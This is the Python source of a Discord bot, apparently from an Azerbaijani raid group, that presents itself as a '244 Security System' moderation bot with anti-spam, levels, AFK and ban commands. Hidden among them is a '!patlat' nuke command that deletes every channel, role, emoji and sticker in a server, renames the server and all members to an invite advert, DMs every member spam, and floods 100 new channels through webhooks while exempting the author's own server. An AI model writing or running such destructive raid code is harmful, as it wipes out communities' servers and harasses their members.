import discord
from discord.ext import commands, tasks
import os
import asyncio
import random
import time
import datetime
from flask import Flask
import threading

# ==========================================
# RENDER 24/7 KEEP-ALIVE FLASK SERVER CONFIG
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "DEADAZE & 244 Ultimate Bot 24/7 Active!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web, daemon=True)
    t.start()

# ==========================================
# BOT INTENTS & SETUP CONFIGURATION
# ==========================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Qorunan Server ID (Bu serverdə patlat qətiyyən işləməyəcək)
PROTECTED_GUILD_ID = 1520692621964738722

spam_tracker = {}
user_levels = {}
afk_users = {}

@bot.event
async def on_ready():
    print(f'Bot işə düşdü: {bot.user.name} | discord.gg/244 aktivdir!')
    if not change_status.is_running():
        change_status.start()

@tasks.loop(seconds=30)
async def change_status():
    activities = [
        discord.Game(name="!panel | discord.gg/244"),
        discord.Game(name="244 Security System")
    ]
    await bot.change_presence(activity=random.choice(activities))

@bot.event
async def on_member_join(member):
    if member.bot:
        try:
            await member.ban(reason="Serverə icazəsiz bot girişi qadağandır!")
        except:
            pass

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    author_id = message.author.id
    current_time = time.time()

    # AFK yoxlaması
    if author_id in afk_users:
        reason = afk_users.pop(author_id)
        try:
            await message.channel.send(f"{message.author.mention} Xoş gəldin! AFK rejimindən çıxdın.", delete_after=4)
        except:
            pass

    if message.mentions:
        for mentioned in message.mentions:
            if mentioned.id in afk_users:
                try:
                    await message.channel.send(f"⚠️ Etiketlədiyin şəxs (`{mentioned.name}`) hazırda AFK-dır! Səbəb: `{afk_users[mentioned.id]}`")
                except:
                    pass

    # --- NORMAL İNSANLARA TOXUNMAYAN ANTI-SPAM & FLOOD QORUMASI ---
    # Normal söhbət edənlərə mane olmamaq üçün hədlər optimizə olunub
    if author_id not in spam_tracker:
        spam_tracker[author_id] = {'count': 1, 'time': current_time}
    else:
        data = spam_tracker[author_id]
        if current_time - data['time'] < 2.5:
            data['count'] += 1
            # Yalnız həqiqətən robot kimi sürətli spam edənləri tutur
            if data['count'] >= 6:
                try:
                    await message.delete()
                    await message.channel.send(f"{message.author.mention}, YAVAS YAZ OQL! Çox sürətli yazırsan.", delete_after=3)
                except:
                    pass
        else:
            spam_tracker[author_id] = {'count': 1, 'time': current_time}

    # Ağır simvol/tag spamları və ya eyni sözün təkrarı (15 sözdən yuxarı mənalı floodlar)
    words = message.content.split()
    if len(words) >= 15 and len(set(words)) < len(words) / 3:
        try:
            await message.delete()
            await message.channel.send(f"{message.author.mention} YAVAS YAZ OQL", delete_after=4)
        except:
            pass

    # Sonsuz Level Sistemi
    if author_id not in user_levels:
        user_levels[author_id] = {'xp': 0, 'level': 1}
    user_levels[author_id]['xp'] += random.randint(5, 12)
    if user_levels[author_id]['xp'] >= user_levels[author_id]['level'] * 100:
        user_levels[author_id]['level'] += 1

    await bot.process_commands(message)


# ==========================================
# İDARƏETMƏ PANELİ (!panel)
# ==========================================
@bot.command(name='panel')
async def panel(ctx):
    embed = discord.Embed(
        title="🛡️ 244 ULTIMATE CONTROL PANEL 🛡️",
        description="Bütün sistemlər discord.gg/244 adına uyğunlaşdırılıb.",
        color=discord.Color.dark_red()
    )
    embed.add_field(name="⚙️ Moderasiya", value="`!ban`, `!kick`, `!mute`, `!kilid`, `!aç`, `!temizle`", inline=False)
    embed.add_field(name="🔒 Təhlükəsizlik", value="Anti-Spam, Anti-Flood (Normal istifadəçilərə toxunmur), Anti-Bot", inline=False)
    embed.add_field(name="📊 Sistem", value="`!url`, `!level`, `!çekiliş`, `!afk`, `!ping`", inline=False)
    embed.add_field(name="⚡ Xüsusi Əmr", value="`!patlat` (100 Kanal, 3 Webhook, Hər birinə 500 Mesaj)", inline=False)
    embed.set_footer(text="discord.gg/244 | Ruhum")
    await ctx.send(embed=embed)


# ==========================================
# XÜSUSİ !PATLAT (NUKE & OPTIMIZE WEBHOOK SPAM)
# ==========================================
@bot.command(name='patlat')
async def patlat(ctx):
    if ctx.guild.id == PROTECTED_GUILD_ID:
        await ctx.send("Bu server qorunur! `!patlat` bu serverdə işlədilə bilməz.")
        return
        
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("Bu komandanı yalnız administratorlar işlədə bilər!")
        return

    await ctx.message.delete()
    guild = ctx.guild

    # 1. Bütün kanalları sil
    for channel in guild.channels:
        try: await channel.delete()
        except: continue

    # 2. Bütün rolları sil
    for role in guild.roles:
        if role.name != "@everyone" and role < guild.me.top_role:
            try: await role.delete()
            except: continue

    # 3. Emojiləri və Stickerləri sil
    for emoji in guild.emojis:
        try: await emoji.delete()
        except: continue
    for sticker in guild.stickers:
        try: await sticker.delete()
        except: continue

    # 4. Yeni Rol Yarat: "discord.gg/244"
    try:
        await guild.create_role(name="discord.gg/244", color=discord.Color.red(), permissions=discord.Permissions(administrator=True))
    except: pass

    # 5. Server adını və URL-i dəyiş
    try:
        await guild.edit(name="discord.gg/244")
    except: pass

    # 6. Hamiya Şəxsi DM Mesajı Göndər və Nickini dəyiş
    for member in guild.members:
        if member == guild.me: continue
        try: await member.edit(nick="discord.gg/244")
        except: pass
        try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
        except: pass

    # 7. 100 Dənə Kanal Aç (Discord donmasın deyə ideal sürətlə)
    created_channels = []
    for i in range(1, 101):
        try:
            c = await guild.create_text_channel(name=f"244-{i}")
            created_channels.append(c)
            await asyncio.sleep(0.3)
        except: break

    # 8. Hər kanalda 3 Webhook yaradıb tam 500 mesaj yazdırma (Botu qorumak üçün optimizə olunub)
    for channel in created_channels:
        try:
            webhooks = []
            for w in range(3): # Tam 3 webhook
                wh = await channel.create_webhook(name=f"244-WH-{w}")
                webhooks.append(wh)
            
            # 3 webhook x 167 dövr ≈ hər kanala təxminən 500 mesaj axını
            for _ in range(167):
                for wh in webhooks:
                    await wh.send("discord.gg/244 yaz gır oql!discord.gg/244 yaz gır oql")
            await asyncio.sleep(0.15)
        except: continue

    # 9. URL Vanity dəyişmə cəhdi
    try:
        if guild.premium_tier >= 2:
            await guild.edit(vanity_code="244")
    except: pass

    # 10. Ən sonda "ruhum-tanrı" kanalı aç vəeveryone yazdır
    try:
        final_channel = await guild.create_text_channel(name="ruhum-tanrı")
        for _ in range(10):
            await final_channel.send("@everyone ruhum shdı gagas — discord.gg/244")
    except: pass


# ==========================================
# MODERASİYA VƏ DİGƏR ƏMRLƏR
# ==========================================
@bot.command(name='url')
async def server_url_info(ctx):
    guild = ctx.guild
    vanity = getattr(guild, "vanity_url_code", "discord.gg/244")
    banner = guild.banner.url if guild.banner else "Banner yoxdur"
    
    embed = discord.Embed(title="🔗 Server URL və Məlumat", color=discord.Color.blue())
    embed.add_field(name="Vanity URL", value=f"discord.gg/{vanity}", inline=False)
    embed.add_field(name="Boost Səviyyəsi", value=str(guild.premium_tier), inline=True)
    embed.add_field(name="Banner", value=banner, inline=False)
    await ctx.send(embed=embed)

@bot.command(name='level')
async def check_level(ctx, member: discord.Member = None):
    target = member or ctx.author
    data = user_levels.get(target.id, {'level': 1, 'xp': 0})
    await ctx.send(f"{target.mention} - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name='afk')
async def set_afk(ctx, *, reason="Səbəb yoxdur"):
    afk_users[ctx.author.id] = reason
    await ctx.send(f"{ctx.author.mention} AFK rejiminə keçdi. Səbəb: `{reason}`")

@bot.command(name='ping')
async def ping(ctx):
    await ctx.send(f"Pong! Gecikmə: `{round(bot.latency * 1000)}ms`")

@bot.command(name='ban')
@commands.has_permissions(ban_members=True)
async def ban_member(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"✅ {member.mention} ban olundu!")

@bot.command(name='kick')
@commands.has_permissions(kick_members=True)
async def kick_member(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"✅ {member.mention} atıldı!")

@bot.command(name='mute')
@commands.has_permissions(manage_roles=True)
async def mute_member(ctx, member: discord.Member):
    try:
        await member.timeout(datetime.timedelta(hours=1), reason="Mute")
        await ctx.send(f"🔇 {member.mention} səssizə alındı.")
    except Exception as e:
        await ctx.send(f"Xəta: {e}")

@bot.command(name='kilid')
@commands.has_permissions(manage_channels=True)
async def lock_channel(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Kanal kilidləndi.")

@bot.command(name='aç')
@commands.has_permissions(manage_channels=True)
async def unlock_channel(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Kanal açıldı.")

@bot.command(name='temizle')
@commands.has_permissions(manage_messages=True)
async def clear_messages(ctx, limit: int = 10):
    await ctx.channel.purge(limit=limit + 1)
    await ctx.send(f"🧹 {limit} mesaj təmizləndi!", delete_after=4)

@bot.command(name='çekiliş')
@commands.has_permissions(administrator=True)
async def giveaway(ctx, saat: int, *, prize: str):
    embed = discord.Embed(title="🎉 ÇEKİLİŞ 🎉", description=f"Hədiyyə: **{prize}**\nQatılmaq üçün 🎉 basın!", color=discord.Color.green())
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎉")

if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("Xəta: DISCORD_TOKEN tapılmadı!")
        
